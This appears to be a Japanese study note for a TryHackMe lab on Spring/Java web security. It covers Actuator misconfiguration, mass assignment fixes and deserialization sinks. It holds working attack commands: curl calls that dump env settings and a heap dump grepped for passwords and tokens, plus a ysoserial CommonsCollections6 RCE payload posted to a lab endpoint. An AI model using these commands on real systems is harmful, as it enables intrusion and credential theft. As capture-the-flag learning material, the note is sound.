# Spring

https://tryhackme.com/room/webframeworksjava

## アクチュエータの構成ミス

```sh
root@ip-10-146-88-55:~# curl -s http://10.146.173.58:8080/actuator | jq '._links | keys'
[
  "beans",
  "caches",
  "caches-cache",
  "conditions",
  "configprops",
  "configprops-prefix",
  "env",
  "env-toMatch",
  "health",
  "health-path",
  "heapdump",
  "info",
  "loggers",
  "loggers-name",
  "mappings",
  "metrics",
  "metrics-requiredMetricName",
  "scheduledtasks",
  "self",
  "threaddump"
]
```

env を叩くと、アプリケーションが読み込んでいるすべての設定（OSの環境変数、application.properties、コマンドライン引数など）が一覧で返ってくる。

```sh
curl -s http://10.146.173.58:8080/actuator/env/app.actuatorflag | jq
```

ヒープダンプ

```sh
root@TryHackMe:~# curl -s http://10.146.173.58:8080/actuator/heapdump -o heap.hprof
root@TryHackMe:~# strings heap.hprof | grep -iE 'password|secret|token' | sort -u | head
```

## マスアサインメント

例えば role などがユーザーから送信されて更新される危険性がある。

```java
@PostMapping("/account/update")
public String update(@ModelAttribute User user, HttpSession session) {
    ...
    users.save(user);
    return "redirect:/account/profile";
}
```

解決策１：更新したいプロパティのみを含むDTOを使う

```java
public class ProfileUpdateDto { private String email; /* no role */ }
public String update(@ModelAttribute ProfileUpdateDto dto, ...) { ... }
```

解決策２：binder を制約

```java
@InitBinder
public void initBinder(WebDataBinder binder) { binder.setAllowedFields("email"); }
```

## デシリアライズ

Javaにおけるデシリアライズ脆弱性（Deserialization Vulnerability）およびリモートコード実行（RCE）に関する、ソースコードレビューや診断時の着眼点。

---

### 1. 脆弱性の温床となるシンク（Sinks）のパターン
Javaコードレビューにおいて、デシリアライズや動的評価が行われる代表的な「シンク（データの吸い込み口）」を以下に示す。これらは静的解析（grep等）で優先的に調査すべき対象となる。

| 対象機能 / ライブラリ | 危険なメソッド・実装例 | 概要・注意点 |
| :--- | :--- | :--- |
| **Java 標準デシリアライズ** | `readObject()` | リクエストボディ等をBase64デコードした後に直接呼び出すと、Java標準のネイティブデシリアライズ脆弱性（RCE）に直結する。 |
| **XStream** | `XStream.fromXML()` | XMLからJavaオブジェクトへ復元する際、未検証の入力があると任意のコード実行に繋がる。 |
| **XMLDecoder** | `XMLDecoder.readObject()` | Java標準のXMLデシリアライズ機構。任意のJavaオブジェクトのインスタンス化やメソッド呼び出しが容易に引き起こされる。 |
| **SnakeYAML** | `yaml.load()` | YAMLデシリアライズ処理。デフォルトの設定ではコンストラクタを経由して任意のクラスを呼び出される危険性がある。 |
| **Jackson (JSON)** | `enableDefaultTyping()` <br> `@JsonTypeInfo` (open typing) | ポリモーフィック・デシリアライズを有効にしている場合、JSONデータに任意のクラスタイプ（Gadget）を指定されてRCEに繋がる。 |
| **SpEL (Spring Expression)** | `SpelExpressionParser` | デシリアライズとは異なるが、Spring固有の強力なRCE経路。評価式（`#{...}`）に外部入力が直接埋め込まれると動的評価される。 |

---

### 2. ガジェットチェーン（Gadget Chain）の特定
シンク（`readObject()` など）の存在だけではRCEは成立しない。ターゲットアプリケーションのクラスパス上に、脆弱な挙動をリレーしてコマンド実行まで繋げられる **ガジェットライブラリ** が存在する必要がある。

#### 依存関係定義ファイルの確認例 (`pom.xml` / Maven)
攻撃試行前にビルドファイル（`pom.xml` や `build.gradle`）を解析することで、どのガジェットチェーンが有効かをあらかじめ特定できる。

```xml
<!-- pom.xml 内の脆弱なライブラリ例 -->
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.2.1</version>
</dependency>
```

*   **特定されたライブラリ**: Apache Commons Collections `3.2.1`
*   **対応するペイロード**: `ysoserial` の **`CommonsCollections6`** チェーンが合致。
*   **アプローチ**: 無闇にペイロードを試行するのではなく、依存関係のバージョン情報から理論的に有効なガジェットを選択して攻撃を組み立てるのが基本。

エクスプロイト例

https://github.com/frohoff/ysoserial/releases

```sh
root@TryHackMe:~# $ java --add-opens=java.base/java.util=ALL-UNNAMED \
  -jar ysoserial-all.jar CommonsCollections6 \
  'cp /flags/deser.txt /app/loot/out.txt' | base64 -w0 > payload.b64
root@TryHackMe:~# curl -s -X POST http://10.146.173.58:8080/internal/import --data-binary @payload.b64

root@TryHackMe:~# curl -s http://10.146.173.58:8080/loot/out.txt
```
